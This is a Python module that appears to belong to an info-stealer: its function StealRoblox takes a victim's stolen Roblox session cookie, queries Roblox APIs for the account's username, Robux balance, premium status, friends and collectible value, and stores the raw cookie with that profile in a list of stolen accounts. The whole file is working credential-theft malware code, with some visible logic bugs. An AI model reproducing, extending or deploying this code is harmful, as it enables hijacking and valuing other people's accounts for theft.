import json
import time
import aiohttp # type: ignore
from main import error_handler
from main import ListFonction

async def StealRoblox(self, cookie, browser) -> None:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": cookie}) as response:
                baseinf = await response.json()
        username, userId,robux,thumbnail, premium, builderclub = baseinf["UserName"], baseinf["UserID"], baseinf["RobuxBalance"],baseinf["ThumbnailUrl"], baseinf["IsPremium"],baseinf["IsAnyBuildersClubMember"]

        async def GetAll(UserID: int) -> list:
            try:
                FullList = []
                async with aiohttp.ClientSession() as session:
                    async with session.get(f'https://friends.roblox.com/v1/users/{UserID}/friends') as response:
                        response_text = await response.text()
                        Friendslist = json.loads(response_text)

                if 'data' in Friendslist:
                    x = 0
                    for friend in Friendslist['data']:
                        if x == 3:
                            return FullList
                        
                        is_banned = friend.get('isBanned', False)
                        has_verified_badge = friend.get('hasVerifiedBadge', False)

                        banned_status = "❌" if not is_banned else "✅"
                        verified_status = "❌" if not has_verified_badge else "✅"

                        FullList.append((friend.get('displayName', ''), friend.get('name', ''), banned_status, verified_status))
                        x += 1
                    return FullList
                else:
                    raise ValueError("No 'data' key in the response.")
            except Exception as e:
                error_handler(f"get all roblox error - {str(e)}")
                return []

        async def GetRAP(UserID):
            ErroredRAP = 0
            TotalValue = 0
            Cursor = ""
            Done = False
            while not Done:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(f"https://inventory.roblox.com/v1/users/{UserID}/assets/collectibles?sortOrder=Asc&limit=100&cursor={Cursor}") as response:
                            data = await response.json()
                            
                    if data.get('nextPageCursor') is None:
                        Done = True
                    else:
                        Cursor = data['nextPageCursor']

                    for Item in data.get("data", []):
                        try:
                            RAP = int(Item.get('recentAveragePrice', 0))
                            TotalValue += RAP
                        except Exception as e:
                            ErroredRAP += 1
                    
                    if not data.get('nextPageCursor'):
                        Done = True
                                
                except Exception as e:
                    error_handler(f"get roblox rap error - {str(e)}")
                    Done = True
            return TotalValue

        friendlist = await GetAll(userId)
        rap = await GetRAP(userId)
        
        if premium == True:
            premium = '✅'
        else:
            premium = '❌'
        if builderclub == True:
            builderclub = '✅'
        else:
            premium = '❌'

        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://users.roblox.com/v1/users/{userId}") as response:
                advancedInfo = await response.json()
        description = 'No Description'
        if advancedInfo["description"]:
            description = advancedInfo["description"]
        if advancedInfo["description"] == True:
            banned = '✅'
        else: 
            banned = '❌'
        creationDate = advancedInfo["created"]
        creationDate = creationDate.split("T")[0].split("-")
        creationDate = f"{creationDate[1]}/{creationDate[2]}/{creationDate[0]}"
        creation_timestamp = time.mktime(time.strptime(creationDate, "%m/%d/%Y"))
        current_timestamp = time.time()
        seconds_passed = current_timestamp - creation_timestamp
        days_passed = round(seconds_passed / (24 * 60 * 60))

    except Exception as e:
        error_handler(f"roblox session error - {str(e)}")
    else:
        ListFonction.RobloxAccounts.append(f"Cookie: {cookie}\nBrowser: {browser}\nUser: {username} ({userId})\nThumbail: {thumbnail}\nRobux: {robux}\nPremium: {premium}\nCreation Date: {creationDate} / {days_passed} Days!\nDescription: {description}\nBanned: {banned}\nRAP: {rap}\nFriends List: \n{friendlist}\n==============================================\n")
        